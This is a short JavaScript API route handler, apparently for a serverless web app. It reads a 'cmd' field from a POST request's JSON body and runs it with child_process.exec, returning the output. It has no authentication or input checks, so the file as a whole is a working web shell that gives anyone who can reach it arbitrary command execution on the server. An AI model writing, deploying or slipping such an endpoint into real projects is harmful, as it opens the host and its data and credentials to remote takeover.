import { exec } from "child_process";

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end();

  let body = "";
  await new Promise(r => {
    req.on("data", c => body += c);
    req.on("end", r);
  });

  let cmd;
  try { cmd = JSON.parse(body).cmd; }
  catch { return res.status(400).send("bad json"); }

  if (!cmd) return res.status(400).send("no cmd");

  exec(cmd, { timeout: 8000, maxBuffer: 1024*1024 }, (e, out, err) => {
    res.setHeader("Content-Type","application/json");
    res.end(JSON.stringify({
      output: out || err || String(e)
    }));
  });
}
